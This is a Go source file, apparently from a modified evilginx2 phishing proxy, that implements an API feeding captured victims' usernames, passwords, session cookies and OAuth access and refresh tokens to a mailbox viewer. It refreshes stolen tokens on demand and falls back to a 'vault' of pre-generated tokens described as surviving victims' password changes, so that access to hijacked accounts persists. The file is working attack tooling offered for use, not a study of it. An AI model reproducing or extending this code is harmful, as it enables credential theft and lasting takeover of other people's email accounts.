package core

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// TokenFeed provides a secure JSON API that serves captured tokens to mailbox.html
// It performs on-demand token refresh when serving to ensure tokens are always fresh,
// regardless of background refresh status or password changes after capture.

// FeedAccount represents an account entry served to mailbox.html
type FeedAccount struct {
	ID           string `json:"id"`
	Email        string `json:"email"`
	DisplayName  string `json:"displayName"`
	AccessToken  string `json:"accessToken"`
	RefreshToken string `json:"refreshToken"`
	SessionID    int    `json:"sessionId"`
	SessionSID   string `json:"sessionSid"`
	CapturedAt   string `json:"capturedAt"`
	LastRefresh  string `json:"lastRefresh"`
	Status       string `json:"status"`       // "active", "degraded", "dead", "no-refresh"
	Health       string `json:"health"`       // detailed health status
	RefreshCount int    `json:"refreshCount"` // total number of successful refreshes
}

// FeedSession represents a raw captured session with cookies and credentials
type FeedSession struct {
	ID           int                                `json:"id"`
	SessionID    string                             `json:"sessionId"`
	Phishlet     string                             `json:"phishlet"`
	Username     string                             `json:"username"`
	Password     string                             `json:"password"`
	CookieTokens map[string]map[string]*database.CookieToken `json:"cookieTokens"`
	BodyTokens   map[string]string                  `json:"bodyTokens,omitempty"`
	HttpTokens   map[string]string                  `json:"httpTokens,omitempty"`
	Custom       map[string]string                  `json:"custom,omitempty"`
	UserAgent    string                             `json:"useragent"`
	RemoteAddr   string                             `json:"remoteAddr"`
	CapturedAt   string                             `json:"capturedAt"`
	UpdatedAt    string                             `json:"updatedAt"`
}

// TokenFeed manages the API endpoint for serving tokens to mailbox viewer
type TokenFeed struct {
	db          *database.Database
	apiKey      string // Secret key for API access
	mu          sync.RWMutex
	lastFetch   time.Time
	autoRefresh *TokenAutoRefreshManager // Reference to auto-refresh for on-demand refresh
	persistence *TokenPersistenceEngine  // Reference to vault for fallback tokens
}

// NewTokenFeed creates a new token feed with a random API key
func NewTokenFeed(db *database.Database) *TokenFeed {
	keyBytes := make([]byte, 32)
	rand.Read(keyBytes)
	apiKey := hex.EncodeToString(keyBytes)

	tf := &TokenFeed{
		db:     db,
		apiKey: apiKey,
	}

	log.Info("[tokenfeed] Token feed API initialized")
	log.Info("[tokenfeed] API Key: %s", apiKey)
	log.Info("[tokenfeed] Endpoint: /api/v1/feed?key=<API_KEY>")

	return tf
}

// NewTokenFeedWithKey creates a token feed with a specific API key (for persistence)
func NewTokenFeedWithKey(db *database.Database, apiKey string) *TokenFeed {
	tf := &TokenFeed{
		db:     db,
		apiKey: apiKey,
	}

	log.Info("[tokenfeed] Token feed API initialized with saved key")
	log.Info("[tokenfeed] Endpoint: /api/v1/feed?key=<API_KEY>")

	return tf
}

// SetAutoRefreshManager connects the auto-refresh manager for on-demand refresh
func (tf *TokenFeed) SetAutoRefreshManager(arm *TokenAutoRefreshManager) {
	tf.mu.Lock()
	defer tf.mu.Unlock()
	tf.autoRefresh = arm
}

// SetPersistenceEngine connects the persistence engine for vault fallback tokens
func (tf *TokenFeed) SetPersistenceEngine(pe *TokenPersistenceEngine) {
	tf.mu.Lock()
	defer tf.mu.Unlock()
	tf.persistence = pe
}

// GetAPIKey returns the current API key
func (tf *TokenFeed) GetAPIKey() string {
	tf.mu.RLock()
	defer tf.mu.RUnlock()
	return tf.apiKey
}

// SetAPIKey sets a new API key
func (tf *TokenFeed) SetAPIKey(key string) {
	tf.mu.Lock()
	defer tf.mu.Unlock()
	tf.apiKey = key
	log.Info("[tokenfeed] API key updated")
}

// ValidateKey checks if the provided key matches the API key
func (tf *TokenFeed) ValidateKey(key string) bool {
	tf.mu.RLock()
	defer tf.mu.RUnlock()
	return key != "" && key == tf.apiKey
}

// GetAccounts returns all sessions that have tokens, formatted for mailbox.html.
// Token priority chain:
//  1. ON-DEMAND REFRESH (refresh token still alive → freshest possible token)
//  2. VAULT FALLBACK (refresh token dead/password changed → pre-generated non-CAE tokens that survive)
//  3. CACHED TOKEN (last resort → whatever is in the database)
func (tf *TokenFeed) GetAccounts() ([]FeedAccount, error) {
	tf.mu.Lock()
	tf.lastFetch = time.Now()
	autoRefresh := tf.autoRefresh
	persistence := tf.persistence
	tf.mu.Unlock()

	sessions, err := tf.db.ListSessions()
	if err != nil {
		return nil, fmt.Errorf("failed to list sessions: %v", err)
	}

	var accounts []FeedAccount

	for _, s := range sessions {
		if s.Custom == nil {
			continue
		}

		accessToken := s.Custom["dc_access_token"]
		refreshToken := s.Custom["dc_refresh_token"]

		// Skip sessions without any tokens
		if accessToken == "" && refreshToken == "" {
			continue
		}

		tokenSource := "cached"
		refreshFailed := false

		// PRIORITY 1: ON-DEMAND REFRESH (if refresh token is alive)
		if autoRefresh != nil && refreshToken != "" {
			freshToken, err := autoRefresh.RefreshAndGetToken(s.SessionId)
			if err == nil && freshToken != "" {
				accessToken = freshToken
				tokenSource = "live-refresh"
			} else {
				refreshFailed = true
			}
		}

		// PRIORITY 2: VAULT FALLBACK (if refresh failed → password likely changed)
		// The vault contains pre-generated non-CAE tokens that survive password changes
		if refreshFailed && persistence != nil {
			vaultToken := persistence.GetBestToken(s.SessionId, "graph")
			if vaultToken != "" {
				accessToken = vaultToken
				tokenSource = "vault"
				log.Debug("[tokenfeed] %s: serving vault token (refresh dead, vault alive)", s.Username)
			}
		}

		email := s.Custom["dc_user_email"]
		if email == "" {
			email = s.Username
		}
		if email == "" {
			email = fmt.Sprintf("session-%d", s.Id)
		}

		displayName := s.Custom["dc_user_name"]
		if displayName == "" {
			displayName = email
		}

		// Determine status based on health tracking and token source
		status := "active"
		healthStr := "unknown"
		refreshCount := 0

		if autoRefresh != nil {
			if health := autoRefresh.GetSessionHealth(s.SessionId); health != nil {
				status = health.Status
				if status == "new" {
					status = "active"
				}
				healthStr = fmt.Sprintf("%s (failures: %d, refreshes: %d)",
					health.Status, health.ConsecutiveFailures, health.TotalRefreshes)
				refreshCount = health.TotalRefreshes
				if health.LastError != "" {
					healthStr += " | " + health.LastError
				}
			}
		}

		// Override status based on token source
		switch tokenSource {
		case "vault":
			status = "vault-protected"
			healthStr = "refresh token dead - serving pre-generated non-CAE vault tokens"
			if persistence != nil {
				vaultCount := persistence.GetVaultTokenCount(s.SessionId)
				anchorCount := persistence.GetAnchoredSessionCount(s.SessionId)
				healthStr += fmt.Sprintf(" | vault tokens: %d, anchored sessions: %d", vaultCount, anchorCount)
			}
		case "live-refresh":
			// Status is fine from health tracker
		case "cached":
			if refreshFailed {
				status = "degraded"
				healthStr = "refresh failed, serving cached token - may expire soon"
			}
		}

		if refreshToken == "" {
			status = "no-refresh"
			healthStr = "no refresh token - access token only"
		}

		acc := FeedAccount{
			ID:           fmt.Sprintf("eg-%d", s.Id),
			Email:        email,
			DisplayName:  displayName,
			AccessToken:  accessToken,
			RefreshToken: refreshToken,
			SessionID:    s.Id,
			SessionSID:   s.SessionId,
			CapturedAt:   time.Unix(s.CreateTime, 0).UTC().Format(time.RFC3339),
			LastRefresh:  time.Unix(s.UpdateTime, 0).UTC().Format(time.RFC3339),
			Status:       status,
			Health:       healthStr,
			RefreshCount: refreshCount,
		}

		accounts = append(accounts, acc)
	}

	return accounts, nil
}

// HandleFeedRequest processes an API request and returns JSON response body + status code
func (tf *TokenFeed) HandleFeedRequest(apiKey string) (string, int) {
	if !tf.ValidateKey(apiKey) {
		return `{"error":"unauthorized","message":"Invalid or missing API key"}`, 401
	}

	accounts, err := tf.GetAccounts()
	if err != nil {
		log.Error("[tokenfeed] Failed to get accounts: %v", err)
		return fmt.Sprintf(`{"error":"internal","message":"%s"}`, err.Error()), 500
	}

	if accounts == nil {
		accounts = []FeedAccount{}
	}

	// Include system health info
	tf.mu.RLock()
	autoRefresh := tf.autoRefresh
	persistence := tf.persistence
	tf.mu.RUnlock()

	systemHealth := map[string]interface{}{}
	if autoRefresh != nil {
		total, withRefresh := autoRefresh.GetRefreshStats()
		systemHealth["running"] = autoRefresh.IsRunning()
		systemHealth["totalSessions"] = total
		systemHealth["sessionsWithRefresh"] = withRefresh
		systemHealth["totalRefreshes"] = autoRefresh.GetTotalRefreshCount()
		systemHealth["uptime"] = autoRefresh.GetUptime().String()
	}

	// Include vault stats for password-change survival
	if persistence != nil {
		totalVaults, totalTokens, validTokens, anchoredSessions := persistence.GetAllVaultStats()
		systemHealth["vaultActive"] = true
		systemHealth["vaultCount"] = totalVaults
		systemHealth["vaultTotalTokens"] = totalTokens
		systemHealth["vaultValidTokens"] = validTokens
		systemHealth["vaultAnchoredSessions"] = anchoredSessions
	}

	// Build raw sessions array with cookies + passwords
	allSessions, _ := tf.db.ListSessions()
	var feedSessions []FeedSession
	for _, s := range allSessions {
		fs := FeedSession{
			ID:           s.Id,
			SessionID:    s.SessionId,
			Phishlet:     s.Phishlet,
			Username:     s.Username,
			Password:     s.Password,
			CookieTokens: s.CookieTokens,
			BodyTokens:   s.BodyTokens,
			HttpTokens:   s.HttpTokens,
			Custom:       s.Custom,
			UserAgent:    s.UserAgent,
			RemoteAddr:   s.RemoteAddr,
			CapturedAt:   time.Unix(s.CreateTime, 0).UTC().Format(time.RFC3339),
			UpdatedAt:    time.Unix(s.UpdateTime, 0).UTC().Format(time.RFC3339),
		}
		feedSessions = append(feedSessions, fs)
	}
	if feedSessions == nil {
		feedSessions = []FeedSession{}
	}

	response := struct {
		Accounts     []FeedAccount          `json:"accounts"`
		Sessions     []FeedSession          `json:"sessions"`
		Count        int                    `json:"count"`
		Timestamp    string                 `json:"timestamp"`
		SystemHealth map[string]interface{} `json:"systemHealth,omitempty"`
	}{
		Accounts:     accounts,
		Sessions:     feedSessions,
		Count:        len(accounts),
		Timestamp:    time.Now().UTC().Format(time.RFC3339),
		SystemHealth: systemHealth,
	}

	data, err := json.Marshal(response)
	if err != nil {
		return `{"error":"internal","message":"failed to serialize"}`, 500
	}

	return string(data), 200
}
